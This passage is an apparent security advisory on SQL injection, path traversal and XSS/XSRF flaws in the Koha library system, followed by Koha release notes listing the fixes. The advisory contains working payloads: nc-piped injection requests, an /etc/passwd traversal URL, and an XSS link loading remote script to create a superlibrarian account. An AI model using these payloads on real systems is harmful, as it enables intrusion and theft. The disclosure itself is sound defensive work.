186\r\n\r\nFilter=P_COM&Filter=&Limit=&output=file&basename=Export&MIME=CSV&sep=%3B&report_name=&do_it=1&userid=<username>&password=<password>&branch=&koha_login_context=intranet&Criteria=ELT(1=2,'evil')"
 | nc testbox 9002

echo -ne "POST /cgi-bin/koha/reports/borrowers_out.pl HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
186\r\n\r\nFilter=P_COM&Filter=&Limit=&output=file&basename=Export&MIME=CSV&sep=%3B&report_name=&do_it=1&userid=<username>&password=<password>&branch=&koha_login_context=intranet&Criteria=ELT(1=1,'evil')"
 | nc testbox 9002

====================================================================
2. "Filter" Parameter, Payload: P_COM'+AND+'a'='a / P_COM'+AND+'a'='b
====================================================================

echo -ne "POST /cgi-bin/koha/reports/borrowers_out.pl HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
183\r\n\r\nkoha_login_context=intranet&Limit=&Criteria=branchcode&output=file&basename=Export&MIME=CSV&sep=;&report_name=&do_it=1&userid=<userid>&password=<password>&branch=&Filter=P_COM'+AND+'a'='a"
 | nc testbox 9002

echo -ne "POST /cgi-bin/koha/reports/borrowers_out.pl HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
183\r\n\r\nkoha_login_context=intranet&Limit=&Criteria=branchcode&output=file&basename=Export&MIME=CSV&sep=;&report_name=&do_it=1&userid=<userid>&password=<password>&branch=&Filter=P_COM'+AND+'a'='b"
 | nc testbox 9002

====================================================================

You will notice different output in every second request, demonstrating the evaluation of the payload.

# ################################################################################################## #
# PoC End                                                                                            #
# ################################################################################################## #

=================================
3. Path Traversal (CVE-2015-4633)
=================================

Vulnerability
-------------
The "template_path" parmeter in /cgi-bin/koha/svc/members/search and /cgi-bin/koha/svc/members/search is vulnerable to
Path Traversal.

Impact
------
A remote attacker my read arbitrary files on the system.

References
----------
<http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14408>

# ################################################################################################## #
# PoC:                                                                                               #
# ################################################################################################## #

The following input is used to print out /etc/passwd:

/cgi-bin/koha/svc/virtualshelves/search?template_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
/cgi-bin/koha/svc/members/search?template_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

# ################################################################################################## #
# PoC End                                                                                            #
# ################################################################################################## #

=================================
4. XSS and XSRF
=================================

Vulnerability
-------------
Koha suffers from various critical XSS and XSRF vulnerabilities due to improper input validation. The site also lacks
in the implementation of challenge tokens that prevent cross-site
forgery (XSRF) attacks.

The attack can be performed by:

- through a compromised user account. User/Password retrieval can happen via brute force, sniffing or through SQLI
(CVE-2015-4633)
- through a user clicking a malicious link (phishing mail, forum link etc.)

The following pages are affected from stored XSS flaws:

/cgi-bin/koha/opac-shelves.pl
/cgi-bin/koha/virtualshelves/shelves.pl

The following pages are affected from relfective XSS flaws:

/cgi-bin/koha/opac-shelves.pl                           (parameters: "direction", "display")
/cgi-bin/koha/opac-search.pl                                    (parameters: "tag")
/cgi-bin/koha/authorities/authorities-home.pl           (parameters: "value")
/cgi-bin/koha/acqui/lateorders.pl                               (parameters: "delay")
/cgi-bin/koha/admin/auth_subfields_structure.pl         (parameters: "authtypecode","tagfield")
/cgi-bin/koha/admin/marc_subfields_structure.pl (parameters: "tagfield")
/cgi-bin/koha/catalogue/search.pl                               (parameters: "limit")
/cgi-bin/koha/serials/serials-search.pl                 (parameters: "bookseller_filter", "callnumber_filter",
"EAN_filter", "ISSN_filter", "publisher_filter", "title_filter")
/cgi-bin/koha/suggestion/suggestion.pl                  (parameters: "author", "collectiontitle", "copyrightdate",
"isbn", "manageddate_from", "manageddate_to", "publishercode",

"suggesteddate_from", "suggesteddate_to")

Impact
----------
The vulnerabilites allow remote attackers to inject arbitrary web script or HTML in order to:

- escalate privileges by targeting staff members with XSRF
- target users via browser exploits
- target the webserver by combining with other server-side vulnerabilities.

References
----------------
<http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14416>
<http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14423>
<http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14418>

# ################################################################################################## #
# PoC / Attack Scenario:                                                                             #
# ################################################################################################## #

Alice, a student with restricted permissions on the system, receives a phishing mail (or reads in some forum) and
clicks the following link:

-->
http://<opac-interface>/cgi-bin/koha/opac-shelves.pl?shelves=1&addshelf=Malicious+Input+<script+src='[http://cst.sba-research.org/x.js'/](http://cst.sba-research.org/x.js%27/)>&sortfield=title&category=2&allow_add=0&allow_delete_own=1&allow_delete_other=0

Bob, library admin, recognizes the new malicious list entry. He logs into the staff area and browses the public lists
in order to delete the entry. Once he opens

--> http://<staff-interface>/cgi-bin/koha/virtualshelves/shelves.pl

the malcious code get's executed. The code can then perform any unauthorized actions with the pemissions of user bob.
For example:

Create new user:
-----------------------

-->
<http://testbox:9002/cgi-bin/koha/members/memberentry.pl?nodouble=&destination=&check_member=&borrowernumber=&nodouble=&title=&firstname=&othernames=&sex=&streetnumber=&streettype=&address2=&city=&state=&zipcode=&country=&phone=&phonepro=&mobile=&email=&emailpro=&fax=&B_address=&B_address2=&B_city=&B_state=&B_zipcode=&B_country=&B_phone=&B_email=&contactnote=&altcontactsurname=&altcontactfirstname=&altcontactaddress1=&altcontactaddress2=&altcontactaddress3=&altcontactstate=&altcontactzipcode=&altcontactcountry=&altcontactphone=&sort1=&sort2=&dateexpiry=&opacnote=&borrowernotes=&patron_attr_1=&BorrowerMandatoryField=surname%7Cdateofbirth%7Ccardnumber%7Caddress&category_type=A&updtype=I&op=insert&surname=hacker&dateofbirth=10%2F06%2F2000&address=fictional&select_city=%7C%7C%7C&cardnumber=9182734629182364&branchcode=MAURES&categorycode=P_COM&dateenrolled=24%2F06%2F2015&userid=hacker&password=hacker&password2=hacker&patron_attr_1_code=PROFESSION&setting_messaging_prefs=1&modify=yes&borrowernumber=&save=Save&setting_extended_patron_attributes=1>

Give the new user superlibririan permission:
----------------------------------------------------------

--> [http://testbox:9002/testbox:9002/cgi-bin/koha/members/member-flags.pl?member=7855&newflags=1&flag=superlibrarian](http://testbox:9002/testbox%3A9002/cgi-bin/koha/members/member-flags.pl?member=7855&newflags=1&flag=superlibrarian)

The attacker can now log as superlibrarian.

Side Note: In order to make the attack work, alice needs to be logged in to the Open Public Catalog interface at the
time of when clicking the malicious link.
Alice needs to have access to the OPAC interface and to have permissions to create public lists.

# ################################################################################################## #
# PoC / Attack Scenario End                                                                          #
# ################################################################################################## #

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](79)
[By Date](date.html#80)
[![Next](/images/right-icon-16x16.png)](81)

[![Previous](/images/left-icon-16x16.png)](79)
[By Thread](index.html#80)
[![Next](/images/right-icon-16x16.png)](81)

### Current thread:

* **SBA Research Vulnerability Disclosure - Multiple Critical Vulnerabilities in Koha ILS** *Raschin Ghanad-Tavakoli (Jun 25)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from koha-community.org_6cedb5af_20250125_014240.html ===

[↓ Skip to Main Content](#primary)

[![Official Website of Koha Library Software](https://koha-community.org/files/2013/09/cropped-kohabanner3.jpg)](https://koha-community.org/)

Main Navigation

Menu

* [Home](https://koha-community.org/)
* [News](https://koha-community.org/news/)
* [About](https://koha-community.org/about/)
  + [History](https://koha-community.org/about/history/)
  + [Project Organization](https://koha-community.org/about/koha-project-organization/)
    - [Horowhenua Library Trust Koha Committee Rules](https://koha-community.org/about/koha-project-organization/horowhenua-library-trust-koha-committee-rules/)
  + [Policy](https://koha-community.org/about/policy/)
    - [Trademark Usage Policy](https://koha-community.org/about/policy/koha-trademark-usage-agreement/)
    - [Comments Policy](https://koha-community.org/about/policy/comments-policy/)
    - [Koha Community Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
  + [Release Schedule](https://koha-community.org/about/release-schedule/)
  + [Worldwide](https://koha-community.org/about/worldwide/)
* [Calendar](https://koha-community.org/calendar/)
* [Demo](https://koha-community.org/demo/)
* [Documentation](https://koha-community.org/documentation/)
* [Download Koha](https://koha-community.org/download-koha/)
* [Get Involved](https://koha-community.org/get-involved/)
  + [Chat](https://koha-community.org/get-involved/chat/)
  + [Enhancing Koha](https://koha-community.org/get-involved/enhancing-koha/)
  + [For Developers](https://koha-community.org/get-involved/for-developers/)
  + [For Librarians](https://koha-community.org/get-involved/for-librarians/)
  + [For Library Users](https://koha-community.org/get-involved/for-library-users/)
* [KohaCon](https://koha-community.org/kohacon/)
  + [KohaCon25](https://koha-community.org/kohacon/kohacon25/)
  + [KohaCon24](https://koha-community.org/kohacon/kohacon24/)
  + [KohaCon23](https://koha-community.org/kohacon/kohacon23/)
  + [KohaCon22](https://koha-community.org/kohacon/kohacon22/)
  + [KohaCon21](https://koha-community.org/kohacon/kohacon21/)
  + [KohaCon20](https://koha-community.org/kohacon/kohacon20/)
  + [KohaCon19](https://koha-community.org/kohacon/kohacon19/)
  + [KohaCon18](https://koha-community.org/kohacon/kohacon18/)
  + [KohaCon17](https://koha-community.org/kohacon/kohacon17/)
  + [KohaCon16](https://koha-community.org/kohacon/kohacon16/)
  + [KohaCon15](https://koha-community.org/kohacon/kohacon15/)
  + [KohaCon14](https://koha-community.org/kohacon/kohacon14/)
    - [Schedule](https://koha-community.org/kohacon/kohacon14/schedule/)
    - [Venue](https://koha-community.org/kohacon/kohacon14/venue/)
* [Support](https://koha-community.org/support/)
  + [Community Support](https://koha-community.org/support/community-support/)
  + [Koha Mailing Lists](https://koha-community.org/support/koha-mailing-lists/)
    - [Web Forums](https://koha-community.org/support/koha-mailing-lists/forums/)
  + [Paid Support](https://koha-community.org/support/paid-support/)
    - [How To Get Listed](https://koha-community.org/support/paid-support/how-to-get-listed/)
  + [Report a problem](https://koha-community.org/support/search-bugs/)

# Koha 3.14.16 released

[Fridolin SOMERS](https://koha-community.org/author/fridolin/ "View all posts by Fridolin SOMERS")

Posted on [Tuesday June 23rd, 2015](https://koha-community.org/koha-3-14-16-released/ "Koha 3.14.16 released")
Posted in [3.14](https://koha-community.org/category/release/3-14/), [release](https://koha-community.org/category/release/)

Tagged with [Announcements](https://koha-community.org/tag/announcements/), [Koha News](https://koha-community.org/tag/koha-news/)

Koha 3.14.16 can be downloaded from: <http://download.koha-community.org/koha-3.14.16.tar.gz>

Installation instructions can be found at <http://wiki.koha-community.org/wiki/Installation_Documentation> or in the INSTALL files that come in the tarball

Koha 3.14.16 is a security release.

#### Table of contents

* [Security bugfixes](#koha-security)
* [Other bugfixes](#koha-other)
* [Changes on system preferences](#koha-sysprefs)
* [System requirements](#koha-requirements)
* [Documentation](#koha-docs)
* [Translations](#koha-translations)
* [Release team](#koha-release-team)
* [Credits](#koha-credits)
* [Revision control](#koha-git)
* [Bug and feature requests](#koha-report-bugs)
### Security bugfixes in Koha 3.14.16

#### Authentication

* Questionable logic regarding session handling in C4::Auth::checkauth() *(major – bug [12954](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=12954))*

#### Lists

* Stored XSS flaw affects OPAC and Staff interface *(major – bug [14416](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14416))*

#### OPAC

* SQL Injection in OPAC Interface *(critical – bug [14412](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14412))*
* XSS Injection point *(major – bug [14360](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14360))*
* XSS Flaws in OPAC Interface *(major – bug [14418](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14418))*

#### Staff Client

* Path traversal vulnerabilty *(critical – bug [14408](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14408))*
* SQL Injection in Staff Client *(critical – bug [14426](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14426))*
* Multiple XSS and XSRF issues in Staff Client *(major – bug [14423](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14423))*

### Other bugs fixed in Koha 3.14.16

#### Authentication

* Auth.pm code issues *(trivial – bug [13521](http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=13521))*

### New system preferences in Koha 3.14.16

### System requirements

Important notes:

* Perl 5.10 is required
* Zebra is required

### Documentation

The Koha manual is maintained in DocBook. The home page for Koha documentation is [http://koha-community.org/documentation](http://koha-community.org/documentation/)

As of the date of these release notes, only the English version of the Koha manual is available at <http://manual.koha-community.org/3.14.16/en/>

The Git repository for the Koha manual can be found at <http://git.koha-community.org/gitweb/?p=kohadocs.git;a=summary>

### Translations

Complete or near-complete translations of the OPAC and staff interface are available in this release for the following languages:

* English (USA)
* Arabic (99%)
* Armenian (100%)
* Czech (100%)
* Danish (88%)
* French (97%)
* German (100%)
* Greek (51%)
* Italian (100%)
* Kurdish (70%)
* Polish (62%)
* Portuguese (100%)
* Slovak (100%)
* Spanish (100%)
* Swedish (89%)
* Turkish (100%)
* Vietnamese (99%)

Partial translations are available for various other languages.

The Koha team welcomes additional translations; please see <http://wiki.koha-community.org/wiki/Translating_Koha>

For information about translating Koha, and join the [koha-translate list](http://lists.koha-community.org/cgi-bin/mailman/listinfo/koha-translate) to volunteer

The most up-to-date translations can be found at [http://translate.koha-community.org](http://translate.koha-community.org/)

### Release Team

The release team for Koha 3.14.16 is

Release Manager: Galen Charlton <gmc@esilibrary.com>

Documentation Manager: Nicole C Engard <nengard@gmail.com>

Installation Documentation Managers:

* Samuel Desseaux <samuel.desseaux@ecp.fr>
* Mason James <mtj@kohaaloha.com>

Translation Manager: Bernardo Gonzalez Kriegel <bgkriegel@gmail.com>

QA Manager: Katrin Fischer <Katrin.Fischer@bsz-bw.de>

QA Team:

* Chris Cormack <chrisc@catalyst.net.nz>
* Marcel de Rooy <M.de.Rooy@rijksmuseum.nl>
* Jonathan Druart <jonathan.druart@biblibre.com>
* Brendan Gallagher <brendan@bywatersolutions.com>
* Kyle Hall <kyle@bywatersolutions.com>
* Mason James <mtj@kohaaloha.com>
* Paul Poulain <paul.poulain@biblibre.com>

Bug Wranglers: Magnus Enger <magnus@enger.priv.no>

Packaging Manager: Robin Sheat <robin@catalyst.net.nz>

Live CD Manager: Nguyen Quoc Uy <nguyenquocuy\_1102@yahoo.com>

VM Manager: Samuel Desseaux <samuel.desseaux@ecp.fr>

Release Maintainer (3.14.x): Fridolin Somers <fridolin.somers@biblibre.com>

Release Maintainer (3.16.x): Galen Charlton <gmc@esilibrary.com>

Release Maintainer (3.18.x): Chris Cormack <chrisc@catalyst.net.nz>

### Credits

We thank the following libraries who are known to have sponsored new features in Koha 3.14.16:

We thank the following individuals who contributed patches to Koha 3.14.16:

* Aleisha (2)
* Chris (7)
* Chris Cormack (4)
* Jonathan Druart (7)
* Mason James (1)
* Martin Renvoize (2)
* Fridolin Somers (5)

We thank the following libraries, companies, and other institutions who contributed patches to Koha 3.14.16:

* BibLibre (5)
* BigBallOfWax (7)
* Catalyst (4)
* KohaAloha (1)
* PTFS-Europe (2)
* koha-community.org (7)
* unidentified (2)

We also especially thank the following individuals who tested patches for Koha 3.14.16:

* Chris Cormack (21)
* Fridolin Somers (20)
* Jonathan Druart (18)
* Katrin Fischer (20)
* Mason James (5)
* Tomas Cohen Arazi (11)
* Kyle M Hall (4)

We regret any omissions. If a contributor has been inadvertently missed, please send a patch against these release notes to koha-patches@lists.koha-community.org.

### Revision control notes

The Koha project uses Git for version control. The current development version of Koha can be retrieved by checking out the master branch of [git://git.koha-community.org/koha.git](//git.koha-community.org/koha.git)

The branch for this version of Koha and future bugfixes in this release line is 3.14.x.

### Bugs and feature requests

Bug reports and feature requests can be filed at the Koha bug tracker at [http://bugs.koha-community.org](http://bugs.koha-community.org/)

He rau ringa e oti ai. (Many hands finish the work)

##### Autogenerated release notes updated last on 23 juin 2015 16:09:13 Z #####

## Post navigation

[Previous Post is ‹ Security Release – Koha 3.16.12](https://koha-community.org/security-release-koha-3-16-12/)[Next Post is Koha Community Newsletter: June 2015 ›](https://koha-community.org/koha-community-newsletter-june-2015/)

#### Community Resources

* [@KohaILS@mastodon.world](https://mastodon.world/%40KohaILS)
* [Bugzilla](https://bugs.koha-community.org "Bugzilla for the Koha Project")
  Bugzilla for the Koha Project
* [Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
* [Gitlab Mirror](https://gitlab.com/koha-community/Koha)
* [Koha Git Repository](https://git.koha-community.org/koha-community/koha "Web interface for public Git repositories for Koha")
  Web interface for public Git repositories for Koha
* [Koha Wiki](https://wiki.koha-community.org)
* [Meeting Transcripts and Minutes](https://meetings.koha-community.org)
* [Open Hub](http://www.openhub.net/p/koha)
* [Project Dashboard](https://dashboard.koha-community.org)
* [Release Schedule](https://koha-community.org/about/release-schedule/)
* [Security policy](https://koha-community.org/security/ "Reporting security issues to the Koha Community")
  Reporting security issues to the Koha Community
* [Twitter](https://twitter.com/kohails)
* [Youtube Channel](https://www.youtube.com/c/KohaILS)

Copyright © 2024 Official Website of Koha Library Software



=== Content from koha-community.org_dce3560f_20250125_014241.html ===

[↓ Skip to Main Content](#primary)

[![Official Website of Koha Library Software](https://koha-community.org/files/2013/09/cropped-kohabanner3.jpg)](https://koha-community.org/)

Main Navigation

Menu

* [Home](https://koha-community.org/)
* [News](https://koha-community.org/news/)
* [About](https://koha-community.org/about/)
  + [History](https://koha-community.org/about/history/)
  + [Project Organization](https://koha-community.org/about/koha-project-organization/)
    - [Horowhenua Library Trust Koha Committee Rules](https://koha-community.org/about/koha-project-organization/horowhenua-library-trust-koha-committee-rules/)
  + [Policy](https://koha-community.org/about/policy/)
    - [Trademark Usage Policy](https://koha-community.org/about/policy/koha-trademark-usage-agreement/)
    - [Comments Policy](https://koha-community.org/about/policy/comments-policy/)
    - [Koha Community Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
  + [Release Schedule](https://koha-community.org/about/release-schedule/)
  + [Worldwide](https://koha-community.org/about/worldwide/)
* [Calendar](https://koha-community.org/calendar/)
* [Demo](https://koha-community.org/demo/)
* [Documentation](https://koha-community.org/documentation/)
* [Download Koha](https://koha-community.org/download-koha/)
* [Get Involved](https://koha-community.org/get-involved/)
  + [Chat](https://koha-community.org/get-involved/chat/)
  + [Enhancing Koha](https://koha-community.org/get-involved/enhancing-koha/)
  + [For Developers](https://koha-community.org/get-involved/for-developers/)
  + [For Librarians](https://koha-community.org/get-involved/for-librarians/)
  + [For Library Users](https://koha-community.org/get-involved/for-library-users/)
* [KohaCon](https://koha-community.org/kohacon/)
  + [KohaCon25](https://koha-community.org/kohacon/kohacon25/)
  + [KohaCon24](https://koha-community.org/kohacon/kohacon24/)
  + [KohaCon23](https://koha-community.org/kohacon/kohacon23/)
  + [KohaCon22](https://koha-community.org/kohacon/kohacon22/)
  + [KohaCon21](https://koha-community.org/kohacon/kohacon21/)
  + [KohaCon20](https://koha-community.org/kohacon/kohacon20/)
  + [KohaCon19](https://koha-community.org/kohacon/kohacon19/)
  + [KohaCon18](https://koha-community.org/kohacon/kohacon18/)
  + [KohaCon17](https://koha-community.org/kohacon/kohacon17/)
  + [KohaCon16](https://koha-community.org/kohacon/kohacon16/)
  + [KohaCon15](https://koha-community.org/kohacon/kohacon15/)
  + [KohaCon14](https://koha-community.org/kohacon/kohacon14/)
    - [Schedule](https://koha-community.org/kohacon/kohacon14/schedule/)
    - [Venue](https://koha-community.org/kohacon/kohacon14/venue/)
* [Support](https://koha-community.org/support/)
  + [Community Support](https://koha-community.org/support/community-support/)
  + [Koha Mailing Lists](https://koha-community.org/support/koha-mailing-lists/)
    - [Web Forums](https://koha-community.org/support/koha-mailing-lists/forums/)
  + [Paid Support](https://koha-community.org/support/paid-support/)
    - [How To Get Listed](https://koha-community.org/support/paid-support/how-to-get-listed/)
  + [Report a problem](https://koha-community.org/support/search-bugs/)

# Security Release – Koha 3.18.8

[Liz Rea](https://koha-community.org/author/admin/ "View all posts by Liz Rea")

Posted on [Tuesday June 23rd, 2015](https://koha-community.org/security-release-koha-3-18-8/ "Security Release – Koha 3.18.8")
Posted in [3.18](https://koha-community.org/category/release/3-18/), [release](https://koha-community.org/category/release/), [releases](https://koha-community.org/category/releases/), [security](https://koha-community.org/category/security/)

Koha is the first free and open source software library automation package

(ILS). Development is sponsored by libraries of varying types and sizes,

volunteers, and support companies from around the world.

The website for the Koha project is

 [<http://koha-community.org/>](http://koha-community.org/)

Koha 3.18.8 can be downloaded from:

 [<http://download.koha-community.org/koha-3.18.08.tar.gz>](http://download.koha-community.org/koha-3.18.08.tar.gz)

Installation instructions can be found at:

 [<http://wiki.koha-community.org/wiki/Installation_Documentation>](http://wiki.koha-community.org/wiki/Installation_Documentation)

OR in the INSTALL files that come in the tarball

```
Koha 3.18.8 is a bugfix/maintenance release.
This release contains critical security fixes, all users of this version are highly recommended to upgrade as soon as is reasonable.

Critical bugs fixed in 3.18.8
======================

Circulation
----------
	12066	major	New renew page in staff client doesn't record branch in statistics

OPAC
----------
	14412	critical	SQL Injection in OPAC Interface
	14360	major	XSS Injection point
	14418	major	XSS Flaws in OPAC Interface

Packaging
----------
	14106	major	Koha-conf paths to zebra libraries are wrong in jessie

Staff Client
----------
	14408	critical	Path traversal vulnerabilty
	14426	critical	SQL Injection in Staff Client
	14423	major	Multiple XSS and XSRF issues in Staff Client

Tools
----------
	10625	major	Inventory/Stocktaking tool cannot handle windows file uploads

Other bugs fixed in 3.18.8
======================

Architecture, internals, and plumbing
----------
	13265	normal	Still too many search cursor cookies
	13815	normal	Plack loose CGI qw(-utf8) flag creating incorrect utf-8 encoding everywhere
	11790	minor	C4::Charset should not depend on C4::Context
	14344	minor	Uninitialized value warning C4/Utils/DataTables/Members.pm

Cataloging
----------
	14047	normal	Sort z39.50 biblio servers by rank in derivate cataloguing doesn't work
	14276	minor	Keep highlight on the active item in item editor
	14327	minor	Fix js error "TypeError: events is null" in additem.js

Circulation
----------
	14299	normal	Today's checkouts not always sorting correctly

Command-line Utilities
----------
	14203	trivial	Koha-translate error string for non-existent lang removal

Database
----------
	14350	minor	Missing statement in kohastructure.sql - DROP TABLE IF EXISTS borrower_sync;

Notices
----------
	14206	normal	Notices using non email templates can't be deleted from the staff client

OPAC
----------
	14173	normal	Paging on 'recent comments' page in OPAC is not displaying correctly
	14025	minor	Fix 856u-links in the OPAC for NORMARC
	14184	minor	Noisy warns in C4/CourseReserves.pm
	14185	minor	Noisy warns in opac-readingrecord.pl
	14186	minor	Noisy warns in opac-reserve.pl

Patrons
----------
	14338	normal	Unable to delete patron images
	11929	minor	Patron modification error shows borrowernumber
	11941	minor	"Patron lists" are not easily accessible

Reports
----------
	14130	normal	Column.def should be updated with descriptions for new columns

System Administration
----------
	14314	trivial	System Preferences: Better explanation for syspref 'ShowReviewerPhoto'

Templates
----------
	14265	normal	Use $.trim instead of trim() in admin/categorie.tt
	14266	normal	Replace trim() with $.trim() in opac-shareshelf.tt
	14279	normal	Remove CGI::scrolling_list from issues_avg_stats.pl
	13946	minor	Change order status 'Pending' to ordered like in database
	14275	minor	Remove CGI::scrolling_list from guided_reports.pl
	14329	trivial	Useless copy/paste from Template::Plugin::HtmlToText
	14330	trivial	Remove unused email_sender from sendbasket/sendshelf

Test Suite
----------
	14112	minor	Silence warnings t/Charset.t

Tools
----------
	10355	minor	Second click on modification log misses object parameter

translate.koha-community.org
----------
	14285	trivial	Bengali locale needs to be re-defined

System requirements
======================

    Important notes:

    * This release makes Koha 3.18 compatible with Debian Jessie

    * Perl 5.10 is required
    * Zebra is required

Documentation
======================

The Koha manual is maintained in DocBook.The home page for Koha
documentation is
> [Documentation](https://koha-community.org/documentation/)

As of the date of these release notes, only the English version of the
Koha manual is available:

    http://manual.koha-community.org/3.18/en/

The Git repository for the Koha manual can be found at

    http://git.koha-community.org/gitweb/?p=kohadocs.git;a=summary

Translations
======================

Complete or near-complete translations of the OPAC and staff
interface are available in this release for the following languages:

  * English (USA)

Partial translations are available for various other languages.

The Koha team welcomes additional translations; please see

    http://wiki.koha-community.org/wiki/Translating_Koha

for information about translating Koha, and join the koha-translate
list to volunteer:

    http://lists.koha-community.org/cgi-bin/mailman/listinfo/koha-translate

The most up-to-date translations can be found at:

    http://translate.koha-community.org/

Release Team
======================

The release team for Koha 3.18.8 is

  Release Manager:       Tomás Cohen Arazi
  Documentation Manager: Nicole C Engard
  Translation Manager:   Bernardo Gonzalez Kriegel
  QA Manager:            Katrin Fischer
  QA Team:               Galen Charlton
                         Jonathan Druart
                         Brendan Gallagher
                         Kyle Hall
                         Julian Maurice
                         Paul Poulain
                         Martin Renvoize
                         Marcel de Rooy
  Bug Wranglers:         Alex Sassmannshausen
                         Zeno Tajoli
  Packaging Manager:     Robin Sheat

  Release Maintainer (3.16.x): Galen Charlton
  Release Maintainer (3.14.x): Fridolin Somers
  Release Maintainer (3.12.x): Kyle Hall

Credits
======================

We thank the following libraries who are known to have sponsored
new features in Koha 3.18.8:

We thank the following individuals who contributed patches to Koha 3.18.8.

  * Aleisha (5)
  * Chris (8)
  * Tomas Cohen Arazi (1)
  * Tomás Cohen Arazi (1)
  * David Cook (2)
  * Chris Cormack (4)
  * Indranil Das Gupta (4)
  * Marcel de Rooy (4)
  * Jonathan Druart (7)
  * Magnus Enger (1)
  * Katrin Fischer (3)
  * Bernardo González Kriegel (5)
  * Kyle M Hall (3)
  * Dobrica Pavlinusic (1)
  * Liz Rea (8)
  * Robin Sheat (2)
  * Zeno Tajoli (1)
  * Mark Tompsett (3)
  * Marc Véron (2)

We thank the following libraries, companies, and other institutions who contributed
patches to Koha 3.18.8

  * BSZ BW (3)
  * BibLibre (3)
  * BigBallOfWax (8)
  * ByWater-Solutions (3)
  * Catalyst (6)
  * Cineca (1)
  * Libriotech (1)
  * Prosentient Systems (2)
  * Rijksmuseum (4)
  * Theke Solutions (1)
  * Universidad Nacional de Córdoba (5)
  * koha-community.org (4)
  * psi.unc.edu.ar (1)
  * rot13.org (1)
  * unidentified (20)
  * veron.ch (2)

We also especially thank the following individuals who tested patches
for Koha 3.18.8.

  * Aleisha (2)
  * Cédric Vita (1)
  * Chris Cormack (39)
  * Gaetan Boisson (1)
  * Jonathan Druart (30)
  * Katrin Fischer (28)
  * Liz Rea (54)
  * Marc Veron (1)
  * Marc Véron (8)
  * Mark Tompsett (5)
  * Nick Clemens (1)
  * Tomas Cohen Arazi (42)
  * Indranil Das Gupta (2)
  * Indranil Das Gupta (L2C2 Technologies) (6)
  * Kyle M Hall (10)
  * Bernardo Gonzalez Kriegel (6)
  * Marcel de Rooy (4)

We regret any omissions.  If a contributor has been inadvertently missed,
please send a patch against these release notes to
koha-patches@lists.koha-community.org.

Revision control notes
======================

The Koha project uses Git for version control.  The current development
version of Koha can be retrieved by checking out the master branch of

    git://git.koha-community.org/koha.git

The last Koha release was 3.14.10, which was released on September 4, 2014.

Bugs and feature requests
======================

Bug reports and feature requests can be filed at the Koha bug
tracker at

    http://bugs.koha-community.org/

He rau ringa e oti ai.
(Many hands finish the work)

##### Autogenerated release notes updated last on 23 Jun 2015 09:09:54 Z #####
```

![](https://secure.gravatar.com/avatar/696a0a543ff5ea07e7ca5f27844f3ca0?s=80&d=mm&r=g) About [Liz Rea](https://koha-community.org/author/admin/ "Posts by Liz Rea")

Koha is the first open-source Integrated Library System (ILS). In use worldwide, its development is steered by a growing community of libraries collaborating to achieve their technology goals.

## Post navigation

[Previous Post is ‹ Security Release – Koha 3.20.1](https://koha-community.org/security-release-koha-3-20-1/)[Next Post is Security Release – Koha 3.16.12 ›](https://koha-community.org/security-release-koha-3-16-12/)

#### Community Resources

* [@KohaILS@mastodon.world](https://mastodon.world/%40KohaILS)
* [Bugzilla](https://bugs.koha-community.org "Bugzilla for the Koha Project")
  Bugzilla for the Koha Project
* [Code of Conduct](https://koha-community.org/about/policy/code-of-conduct/)
* [Gitlab Mirror](https://gitlab.com/koha-community/Koha)
